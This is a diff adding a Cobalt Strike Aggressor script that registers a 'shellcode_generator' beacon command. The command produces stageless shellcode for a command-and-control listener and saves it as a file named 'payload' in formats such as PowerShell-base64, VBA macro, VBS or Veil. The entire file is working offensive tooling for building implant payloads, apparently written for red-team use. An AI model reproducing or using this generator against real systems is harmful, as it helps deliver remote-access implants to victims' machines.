@@ -1,0 +1,62 @@
+# Author: Chris Sikes
+# Date: Apr 2021
+# Create stageless shellcode for the listener, with an exitfunc, and architecture, of type array, hex, powershell-base64, vba, vbs, or veil
+
+
+alias shellcode_generator {
+	local('$bid $handle $data $exitfunc $listener $payload $arch $transform');
+
+	# check our arguments
+	if (size(@_) != 5) {
+		berror($1, "shellcode_generator: not enough arguments. Enter Listener");
+		return;
+	}
+
+	# parse our arguments
+	$transform	= $2;
+	$exitfunc	= $3;
+	$arch		= $4;
+	$listener = $5;
+
+
+	# Verify transform is array, hex, powershell-base64, vba, vbs, or veil
+	if (($transform !ismatch "array") && ($transform !ismatch "hex") && ($transform !ismatch "powershell-base64") && ($transform !ismatch "vba") && ($transform !ismatch "vbs") && ($transform !ismatch "veil"))
+	{
+		berror($1, "shellcode_generator: enter a valid shellcode format, either array, hex, powershell-base64, vba, vbs, or veil");
+		return;
+	}
+
+	# Verify exitfunc is thread or process
+	if (($exitfunc !ismatch "thread") && ($exitfunc !ismatch "process"))
+	{
+		berror($1, "shellcode_generator: enter a valid exitfunc, either thread or process");
+		return;
+	}
+
+	# Verify arch is x86 or x64
+	if (($arch !ismatch "x64") && ($arch !ismatch "x86"))
+	{
+		berror($1, "shellcode_generator: enter a valid architecture, either x86 or x64");
+		return;
+	}
+
+	if (listener_info($5) is $null)
+	{
+		berror($1, "Listener $5 is not found");
+	}
+	else
+	{
+    	# Generate a new payload 
+    	$payload = payload($listener, $arch, $exitfunc);
+		$payload = transform($payload, $transform);
+		$handle = openf(">payload");
+		writeb($handle, $payload);
+		closef($handle);
+
+		# announce to our user..
+		btask($1, "output to payload");
+
+	}
+}
+
+beacon_command_register("shellcode_generator", "Create stageless shellcode for the listener, thread, and architecture.", "Synopsis: shellcode_generator [shell_type] [exitfunc] [x86/x64] [listener] \n\nTo create stageless shellcode for the listener, and save it as 'payload' in the cobalt strike directory\nShellcode types:array, hex, powershell-base64, vba, vbs, or veil\nExitfunc options:thread/process.");
